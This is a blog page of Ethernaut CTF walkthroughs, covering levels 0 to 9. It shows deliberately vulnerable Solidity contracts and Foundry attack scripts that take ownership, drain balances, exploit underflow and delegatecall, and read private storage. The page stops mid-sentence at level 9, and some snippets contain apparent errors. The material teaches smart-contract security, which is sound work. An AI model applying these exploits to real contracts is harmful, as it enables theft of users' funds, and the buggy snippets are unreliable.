<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <title>ethernaut</title>
    <meta content="" name="description">
    <meta content="" name="keywords">

    <!-- Favicons -->
    <link href="../assets/img/favicon.jpg" rel="icon">
    <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">

    <!-- Google Fonts -->
    <link
        href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
        rel="stylesheet">
    <script src="https://kit.fontawesome.com/67ced9e5a8.js" crossorigin="anonymous"></script>


    <!-- Vendor CSS Files -->
    <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
    <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
    <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
    <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
    <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

    <!-- Template Main CSS File -->
    <link href="../assets/css/style.css" rel="stylesheet">
    <link href="./css/blogStyle.css" rel="stylesheet">

    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/tomorrow-night-blue.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>

    <!-- and it's easy to individually load additional languages -->
    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script> -->

    <script>hljs.highlightAll();</script>

</head>

</head>

<body>
    <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>

    <!-- ======= Header ======= -->
    <header id="header">
        <div class="d-flex flex-column">

            <div class="profile">
                <img src="../assets/img/profile-img.jpg" alt="" class="img-fluid rounded-circle">
                <center>
                    <h4 class="text-light">@rama_eth</h4>
                </center>
                <div class="social-links mt-3 text-center">
                    <a href="https://twitter.com/TavanamRama" class="twitter" target="_blank"><i
                            class="bx bxl-twitter"></i></a>
                    <a href="https://github.com/ramachandrareddy352" class="instagram" target="_blank"><i
                            class="bx bxl-github"></i></a>
                    <a href="https://www.instagram.com/rama_chandra_reddy_tavanam/" class="instagram" target="_blank"><i
                            class="bx bxl-instagram"></i></a>
                    <a href="https://www.linkedin.com/in/ramachandratavanam/" class="linkedin" target="_blank"><i
                            class="bx bxl-linkedin"></i></a>
                </div>
            </div>

            <nav id="navbar" class="nav-menu navbar">
                <ul>
                    <li><a href="../index.html" class="nav-link scrollto"><i class="bx bx-home"></i>
                            <span>Home</span></a></li>
                    <li><a href="../index.html" class="nav-link scrollto"><i class="bx bx-user"></i>
                            <span>About</span></a>
                    </li>
                    <li><a href="../index.html" class="nav-link scrollto"><i class="bx bx-file-blank"></i>
                            <span>Resume</span></a></li>
                    <li><a href="../index.html" class="nav-link scrollto"><i class="bx bx-share-alt"></i>
                            <span>Portfolio</span></a></li>
                    <li><a href="../index.html" class="nav-link scrollto active"><i class="bx bx-book-content"></i>
                            <span>Blogs/Ethernaut</span></a></li>
                    <li><a href="../index.html" class="nav-link scrollto"><i class="bx bx-server"></i>
                            <span>Services</span></a></li>
                    <li><a href="../index.html" class="nav-link scrollto"><i class="bx bx-envelope"></i>
                            <span>Contact</span></a></li>
                </ul>
            </nav>
            <!-- .nav-menu -->
        </div>
    </header>

    <main id="main">

        <!-- ======= Blog data Section ======= -->
        <div class="container" id="blog">
            <div class="container">

                <!-- Introduction -->
                <div>
                    <h3> >> Ethernaut CTF's</h3>
                    <p>Hello WEB3, In this blog series, we embark on a journey through the
                        <a href="https://ethernaut.openzeppelin.com/" target="_blank">Ethernaut CTF</a> challenges,
                        exploring
                        each level's intricacies, unraveling the mysteries of smart contract vulnerabilities, and
                        mastering
                        the
                        art of Ethereum security. Whether you're a seasoned blockchain developer looking to sharpen your
                        skills
                        or a newcomer eager to delve into the world of decentralized finance (DeFi), this guide aims to
                        equip
                        you with the knowledge and expertise needed to navigate the complexities of Ethereum smart
                        contract
                        security.
                    </p>
                    <p>
                        Join me as we unravel the secrets of the blockchain, one challenge at a time, and emerge as
                        masters
                        of
                        Ethereum security through the Ethernaut CTF challenges.
                    </p>
                    <p>
                        I recommend to go through the ethereum101, solidity 101 and solidity 201 modules of the
                        <a href="https://secureum.substack.com/" target="_blank">Secureum
                            bootcamp</a> before taking up these challenges. This repository can be useful as a template
                        for
                        the
                        people who want’s to solve ethernaut by using foundry.
                    </p>
                    <div class="repo">
                        <div>
                            <i>Solution repo</i> : <a href="https://github.com/ramachandrareddy352/ethernaut"
                                target="_blank">https://github.com/ramachandrareddy352/ethernaut</a>
                        </div>
                    </div>

                    <br>
                    <span>Clone the repo to locally</span>
                    <div class="repo">
                        <span>$ git clone https://github.com/ramachandrareddy352/ethernaut</span><br>
                        <span>$ cd ethernaut</span><br>
                        <span>$ forge build</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 0-Hello -->
                <div>
                    <h4>0-Hello Ethernaut</h4>
                    <span id="levelBox">Hello.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hello {

    string public password;
    uint8 public infoNum = 42;
    string public theMethodName = 'The method name is method7123949.';
    bool private cleared = false;
  
    constructor(string memory _password) public {
        password = _password;
    }
  
    function info() public pure returns (string memory) {
        return 'You will find what you need in info1().';
    }
  
    function info1() public pure returns (string memory) {
        return 'Try info2(), but with "hello" as a parameter.';
    }
  
    function info2(string memory param) public pure returns (string memory) {
        if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
            return 'The property infoNum holds the number of the next info method to call.';
        }
        return 'Wrong parameter.';
    }
  
    function info42() public pure returns (string memory) {
       return 'theMethodName is the name of the next method.';
    }
  
    function method7123949() public pure returns (string memory) {
        return 'If you know the password, submit it to authenticate().';
    }
  
    function authenticate(string memory passkey) public {
        if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
            cleared = true;
        }
    }
  
    function getCleared() public view returns (bool) {
        return cleared;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal : </h5>
                        <ul>
                            <li>This level walks you through the very basics of how to play the game. In this level we
                                are
                                learing the basics of setting up instance and call the functions through
                                browser. The source code was given to us. We have to deploy the instance and call
                                the <b>authenticate()</b> method on it and follow the instructions to solve the
                                challenge.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">HelloSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import {Hello} from "../src/Hello.sol";

contract HelloSolve is Script{

    Hello public hello = Hello(0xAd10DADdaAbb8Efbd597Bd9b20eB135968d781b1);

    function run() external{
        string memory password = hello.password();
        console.log("Password : ", password);
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        hello.authenticate(password);
        vm.stopBroadcast();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/HelloSolve.s.sol:HelloSolve --rpc-url $RPC_URL --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 1-Fallback -->
                <div>
                    <h4>1-Fallback</h4>
                    <span id="levelBox">Fallback.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>Our goal is to claim ownership of the contract</li>
                                <li>And reduce the contract balance to '0' amount</li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                To complete the challenge, first we have to claim the ownership of contract by
                                contribute
                                with small amount of ether(0.0001) by calling <b>contribute()</b> function.
                            </li>
                            <li>
                                By contributing intitiall we can able to pass the check conditions in
                                <b>receive()</b> function.
                            </li>
                            <li>
                                After contributing we trigger recieve funtion by sending small amount of ethers by
                                passing
                                empty bytes data parameters.
                            </li>
                            <li>
                                After claiming the ownership we call <b>withdraw()</b> function to drain the funds in
                                the
                                contract.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">FallbackSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract Level0Solve is Script {

    Fallback public fallback = Fallback(payable(0xa5D558468A511D05650F923305eC7c1a268A651f));

    function run() external{

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", fallback.owner());        
        
        // at initial we are contributing with 0.0001 ethers
        fallback.contribute{value: 0.0001 ether}();
        address(fallback).call{value: 1 wei}("");

        console.log("New Owner : ", fallback.owner());
        console.log("Initial Balance : ", address(fallback).balance);
        fallback.withdraw();
        console.log("Final Balance : ", address(fallback).balance);
        vm.stopBroadcast();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/FallbackSolve.s.sol:FallbackSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 2-Fallout -->
                <div>
                    <h4>2-Fallout</h4>
                    <span id="levelBox">Fallout.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>Claim ownership of the contract below to complete this level.</li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                In solidity <b>
                                    <=0.6.0 </b> the name of the contract function is the default constructor function.
                            </li>
                            <li>
                                At first, this contract appears to have one constructor and four functions. But if we
                                look
                                closer at the constructor, we realize that the name of the function is slightly
                                different
                                than the <b>contract’s name.</b>
                            </li>
                            <li>
                                As a result, this function is not a constructor, but a classic public function. Anyone
                                can
                                call the <b>fal1out()</b> function
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">FalloutSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutSolve is Script{
    Fallout public fallout = Fallout(0x99a054250f3DE6fEa6320e979860C98ce3E93AB9);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", fallout.owner());
        fallout.Fal1out();
        console.log("New Owner : ", fallout.owner());
        fallout.collectAllocations();
        vm.stopBroadcast();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/FalloutSolve.s.sol:FalloutSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 3-Coinflip -->
                <div>
                    <h4>3-Coinflip</h4>
                    <span id="levelBox">Coinflip.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>This is a coin flipping game where you need to build up your winning streak by
                                    guessing
                                    the outcome of a coin flip. To complete this level you'll need to use your psychic
                                    abilities to guess the correct outcome 10 times in a row.</li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                The contract given tries to simulate random coin flip by generating true or false using
                                the
                                block number. But this is not actually really random! You
                                can very easily query the network to see the current block number.
                            </li>
                            <li>
                                Turns out random number generation is one of the serious pitfalls of blockchains due to
                                deterministic nature. That's why there are dedicated services for the purpose like
                                <b>Chainlink
                                    VRF</b>.
                            </li>
                            <li>
                                Since this block number can be easily accessible, we can also generate the result of
                                coin
                                flip and feed this result to flip function to have a correct guess and increment
                                consecutiveWins.
                            </li>
                            <li>
                                We are able to do this because block time of the network will be long enough so that
                                <b>block.number</b> doesn't change between function calls.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">CoinflipSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipSolve is Script{
    CoinFlip public coinflip = CoinFlip(0x99a054250f3DE6fEa6320e979860C98ce3E93AB9);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack(coinflip).attack();
        console.log("Consecutive wins : ",coinflip.consecutiveWins());
        vm.stopBroadcast();

    }
}
    
contract Attack {
    CoinFlip public coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinflip){
        coinflip = _coinflip;
    }

    function attack() public{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        require(coinflip.flip(side), "Attack : Wrong answer");
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/CoinflipSolve.s.sol:CoinflipSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 4-Telephone -->
                <div>
                    <h4>4-Telephone</h4>
                    <span id="levelBox">Telephone.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}    
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    Gola of this level is to claim ownership of the contract.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                <b>tx.origin</b> returns the address of the externally-owned account (EOA) that
                                originated
                                the transaction.
                            </li>
                            <li>
                                <b>msg.sender</b> returns the address of the immediate caller of the function or
                                message.
                            </li>
                            <li>
                                We can call the <b>changeFunction()</b> from a smart contract address then the
                                msg.sender is
                                the Smart contract address and tx.origin is the EOA address. Which are not same to each
                                other.</li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">TelephoneSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneSolve is Script {
    Telephone public telephone = Telephone(0xDf99F7281e53fF270590F3e44661038fCCd888d8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", telephone.owner());

        Attack attack = new Attack(telephone);
        console.log("Attack Address : ", address(attack));

        console.log("New Owner : ", telephone.owner());
        vm.stopBroadcast();
    }
}

contract Attack {
    Telephone public telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
        telephone.changeOwner(0xd0509B83468409A75De2771C1Ae7bE1026A69927);
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/TelephoneSolve.s.sol:TelephoneSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 5-Token -->
                <div>
                    <h4>5-Token</h4>
                    <span id="levelBox">Token.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}   
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is for you to hack the basic token contract below.
                                </li>
                                <li>
                                    You are given 20 tokens to start with and you will beat the level if you somehow
                                    manage
                                    to get your hands on any additional tokens. Preferably a very large amount of
                                    tokens.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                In Token contract they uses solidity <b>0.6.0</b> pragma version, In this version there
                                are
                                not default checks for Arithmetic overflow/underflow conditions.
                            </li>
                            <li>
                                In this contract we can clearly observe that in <b>transfer()</b> function there is no
                                check
                                for Arithmetic overflow/underflow conditions while updating balance mapping values.
                            </li>
                            <li>
                                The check <b>balances[msg.sender] - _value</b> done by require inside transfer will
                                result
                                in an
                                underflow. The result of the operation is <b>uint256(-1)</b> that is equal to
                                <b>(2**256) –
                                    1</b>.
                            </li>
                            <li>We have balance of <b>20 Tokens</b> and we are transfering <b>21 token</b>, it cause
                                Arithmetic overflow of 20 - 21 = (2**256) - 1</li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">TokenSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Token} from "../src/Token.sol";

contract TokenSolve is Script {
    Token public token = Token(0xad41e7bBf1F0DF0d55095E786f558d0e63B074dB);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before attack Token contract balance : ", Itoken.balanceOf(address(token)));

        Attack attack = new Attack(address(token));
        console.log("Attack Address : ", address(attack));

        console.log("After attack Token contract balance : ", Itoken.balanceOf(address(token)));
        vm.stopBroadcast();
    }
}

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract Attack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/TokenSolve.s.sol:TokenSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 6-Delegation -->
                <div>
                    <h4>6-Delegation</h4>
                    <span id="levelBox">Delegation.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegation {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is for you to claim ownership of the instance.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                Delegation stores the success of the delegatecall into the result variable and keep
                                going
                                with the contract's code.
                                So at the end of the day, what it does it just forward the whole transaction data to the
                                Delegate contract.
                            </li>
                            <li>
                                But there’s another important thing to remember! delegatecall is a special opcode that.
                                Let's read it again from the Solidity Docs for delegatecall:
                            </li>
                            <li>
                                <i>
                                    The code at the target address is executed in the context (i.e. at the address) of
                                    the
                                    calling contract and msg.sender and msg.value do not change their values. This means
                                    that a
                                    contract can dynamically load code from a different address at runtime. Storage,
                                    current
                                    address and balance still refer to the calling contract, only the code is taken from
                                    the
                                    called address.
                                </i>
                            </li>
                            <li>
                                The <b>fallback</b> function has a delegate call to “Delegate” contract. In delegate
                                call,
                                the code
                                present in the called contract is executed in the context of caller contract. The
                                context
                                includes <b>storage</b> and <b>msg object</b> among others.
                            </li>
                            <li>
                                This mean that, if for example, we execute the <b>pwn()</b> function of Delegation
                                contract
                                that
                                update the owner variable that is stored in slot0 of the contract it will not update the
                                Delegate's storage slot0 but it will update the <b>Delegation's storage</b> slot0!
                            </li>
                            <li>
                                To call the pwn(), we have to <b>encode the signature of pwn()</b> function to <b>4
                                    bytes of
                                    keccak256
                                    hash</b> of function signature and pass the payload
                                calldata to the fallback function as parameter in the Delegation contract.It is used to
                                identify the function in the called contract
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">DelegationSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationSolve is Script {
    Delegation public delegation = Delegation(0x3f754D1a4278A32d91BF822027761E3Bdd75b119);

    function run() external{
        vm.startBroadcast();
        console.log("Initial Owner : ", delegation.owner());
        
        // delegate call the pwn() function
        address(delegation).call(abi.encodeWithSignature("pwn()"));

        console.log("New Owner : ", delegation.owner());
        
        vm.stopBroadcast();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/DelegationSolve.s.sol:DelegationSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 7-Force -->
                <div>
                    <h4>7-Force</h4>
                    <span id="levelBox">Force.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ 
}  
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is to make the balance of the contract greater than zero.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                We can see that there is no any <b>functions or receive/fallback</b> functions to send
                                any
                                ethers.
                            </li>
                            <li>
                                If we send any ethers directly the smart contrcat does not accept and it <b>reverts</b>
                                the
                                transaction.
                            </li>
                            <li>
                                There are two ways to send ethers even if there not exist of payable functions.
                            </li>
                            <li>
                                1) We can send ethers <b>before deploying</b> of smart contract.
                            </li>
                            <li>
                                2) By calling <b>selfdestruct()</b> function and passing force contract as parameter we
                                can
                                complete the challenge.
                            </li>
                            <li>
                                <b>NOTE</b> <i>If a contract is removed by selfdestruct, it is still part of the history
                                    of
                                    the
                                    blockchain and probably retained by most Ethereum nodes. So using selfdestruct is
                                    not
                                    the
                                    same as deleting data from a hard disk.

                                    Even if a contract’s code does not contain a call to selfdestruct, it can still
                                    perform
                                    that
                                    operation using delegatecall or callcode.
                                </i>
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">ForceSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Force} from "../src/Force.sol";

contract ForceSolve is Script {
    Force public force = Force(0xf6B39D70fDA787aB1cd9eF0DD6AC2190f34a6458);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before balance : ", address(force).balance);

        new Attack{value: 0.0001 ether}(address(payable(force)));
        
        console.log("After balance : ", address(force).balance);
        vm.stopBroadcast();
    }
}

contract Attack {
    receive() external payable {}

    constructor(address payable _force) payable {
        selfdestruct(_force);
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/ForceSolve.s.sol:ForceSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 8-Vault -->
                <div>
                    <h4>8-Valut</h4>
                    <span id="levelBox">Vault.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is to "Unlock the vault to pass the level!".
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>We can <b>unlock()</b> the function by passing correct password as parameter.</li>
                            <li>But the password variable is <b>private</b> so we can't able to access publicly.</li>
                            <li>The first thing that you must remember when you use or develop on the blockchain is that
                                nothing is private in the blockchain. Everything can be seen even if you declare a
                                variable
                                as private or internal. I suggest you to read more about this concept by reading <a
                                    href="https://swcregistry.io/docs/SWC-136/" target="_blank">SWC-136:
                                    Unencrypted Private Data On-Chain</a>.</li>
                            <li>
                                Anyone from off-chain can easily query that value. We see that password is stored in
                                storage
                                <b>slot 1</b>.
                            </li>
                            <li>We can use foundry cheatcode <b>vm.load</b> to read password and call the
                                <b>unlock()</b> to
                                unlock the vault.
                            </li>
                            <li>
                                In EVM every each storage slot will use <b>32 bytes</b> (word size)
                            </li>
                            <li>
                                Multiple, contiguous items that need less than <b>32</b> bytes are packed into a single
                                storage slot
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">VaultSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Vault} from "../src/Vault.sol";

contract VaultSolve is Script {
    Vault public vault = Vault(0xc08C8451b01d31fca6421555b0A0431AFA2aBF8a);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Vault locked : ", vault.locked());
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console.logBytes32(password);

        vault.unlock(password);

        console.log("Vault locked : ", vault.locked());
        vm.stopBroadcast();
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/VaultSolve.s.sol:VaultSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 9-King -->
                <div>
                    <h4>9-King</h4>
                    <span id="levelBox">King.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The contract below represents a very simple game: whoever sends it an amount of
                                    ether
                                    that is larger than the current prize becomes the new king. On such an event, the
                                    overthrown king gets paid the new prize, making a bit of ether in the process! As
                                    ponzi
                                    as it gets xD
                                </li>
                                <li>
                                    Such a fun game. Your goal is to break it.
